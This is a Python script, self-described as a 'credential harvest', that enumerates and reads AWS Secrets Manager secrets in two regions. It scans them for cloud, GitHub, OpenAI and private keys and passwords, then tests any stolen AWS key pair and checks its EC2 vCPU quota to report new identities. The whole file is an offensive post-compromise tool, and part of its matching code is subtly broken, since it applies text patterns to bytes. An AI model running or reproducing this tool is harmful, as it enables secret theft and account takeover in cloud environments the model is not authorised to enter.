#!/usr/bin/env python3
"""c211-i119860 pass 2: read-only Secrets Manager credential harvest.

Lists secrets in eu-west-2 and us-east-1, fetches at most 8 per region, and
prints ONLY metadata (name, byte length, sha12, matched pattern names). Any
recovered AWS key pair is validated in-process (sts:GetCallerIdentity +
L-DB2E81BA quota) and only the resulting ARN/account/quota is printed. Azure /
GCP material is reported as found with identifier prefixes only. Secret values
are never printed.
"""
import hashlib
import json
import os
import re
import subprocess
import sys

REGIONS = ['eu-west-2', 'us-east-1']
MAX_PER_REGION = 8

PATS = {
    'aws_akid': re.compile(r'AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}'),
    'aws_secret_ctx': re.compile(r'(?i)(secret[_-]?access[_-]?key|awssecretkey|secret_key)["\'=: ]{1,6}([A-Za-z0-9/+=]{30,})'),
    'azure_client_secret': re.compile(r'(?i)(client[_-]?secret|clientsecret)["\'=: ]{1,6}([A-Za-z0-9_~.\-]{30,})'),
    'gcp_sa': re.compile(r'"type"\s*:\s*"service_account"'),
    'private_key': re.compile(r'-----BEGIN (RSA |EC )?PRIVATE KEY-----'),
    'github_pat': re.compile(r'gh[pousr]_[A-Za-z0-9]{30,}'),
    'openai_key': re.compile(r'sk-[A-Za-z0-9]{30,}'),
    'password': re.compile(r'(?i)(password|passwd)["\'=: ]{1,6}([^\s"\']{8,})'),
}
AK = re.compile(r'"?(access[_-]?key|accessKeyId|aws_access_key_id)"?\s*[:=]\s*"?(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})')
SK = re.compile(r'"?(secret[_-]?access[_-]?key|secretKey|aws_secret_access_key)"?\s*[:=]\s*"?([A-Za-z0-9/+=]{30,})')


def aws(args, timeout=60, env=None):
    p = subprocess.run(['aws'] + args, capture_output=True, text=True, timeout=timeout, env=env)
    return p.returncode, p.stdout, p.stderr


def validate_aws(ak, sk):
    env = dict(os.environ)
    env['AWS_ACCESS_KEY_ID'] = ak
    env['AWS_SECRET_ACCESS_KEY'] = sk
    env.pop('AWS_SESSION_TOKEN', None)
    env['AWS_PAGER'] = ''
    rc, out, err = aws(['sts', 'get-caller-identity', '--output', 'json'], env=env)
    if rc != 0:
        return 'STS_DENIED %s' % (err or out).strip().replace('\n', ' ')[:160]
    d = json.loads(out)
    arn = d.get('Arn')
    quota = 'n/a'
    for r in ('eu-west-2', 'us-east-1'):
        rc2, out2, err2 = aws(['service-quotas', 'get-service-quota', '--service-code', 'ec2',
                               '--quota-code', 'L-DB2E81BA', '--region', r,
                               '--query', 'Quota.Value', '--output', 'text'], env=env)
        quota = '%s L-DB2E81BA=%s' % (r, out2.strip() if rc2 == 0 else 'ERR')
        if rc2 == 0:
            break
    return 'NEW_AWS_IDENTITY arn=%s account=%s %s' % (arn, d.get('Account'), quota)


def main():
    summary = {'regions': {}, 'new_identities': []}
    for region in REGIONS:
        rc, out, err = aws(['secretsmanager', 'list-secrets', '--region', region,
                            '--query', 'SecretList[].{n:Name,a:ARN}', '--output', 'json'], timeout=60)
        if rc != 0:
            print('SECRETS_LIST %s FAIL rc=%s %s' % (region, rc, (err or out).strip().replace('\n', ' ')[:200]))
            continue
        try:
            secrets = json.loads(out)
        except Exception:
            secrets = []
        print('SECRETS_LIST %s count=%d names=%s' % (region, len(secrets),
              ','.join(s.get('n', '') for s in secrets)[:800]))
        summary['regions'][region] = {'count': len(secrets)}
        for s in secrets[:MAX_PER_REGION]:
            name = s.get('n', '')
            rc, out, err = aws(['secretsmanager', 'get-secret-value', '--region', region,
                                '--secret-id', name, '--query', 'SecretString', '--output', 'text'], timeout=60)
            if rc != 0:
                print('SECRET %s/%s GET_FAIL rc=%s %s' % (region, name, rc, (err or out).strip().replace('\n', ' ')[:160]))
                continue
            data = out or ''
            b = data.encode('utf-8', 'replace')
            hits = {}
            for k, rx in PATS.items():
                m = rx.findall(data)
                if m:
                    hits[k] = len(m)
            rec = {'name': name, 'bytes': len(b), 'sha12': hashlib.sha256(b).hexdigest()[:12], 'hits': hits}
            akm = AK.search(data.encode('utf-8', 'replace'))
            skm = SK.search(data.encode('utf-8', 'replace'))
            if akm and skm:
                rec['aws'] = validate_aws(akm.group(2).decode(), skm.group(2).decode())
                if rec['aws'].startswith('NEW_AWS_IDENTITY'):
                    summary['new_identities'].append({'secret': name, 'identity': rec['aws']})
            print('SECRET %s/%s %s' % (region, name, json.dumps(rec)[:900]))
    print('SECRETS_SUMMARY %s' % json.dumps(summary)[:3000])
    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except Exception as e:
        print('SECRETS_FATAL %s' % repr(e)[:300])
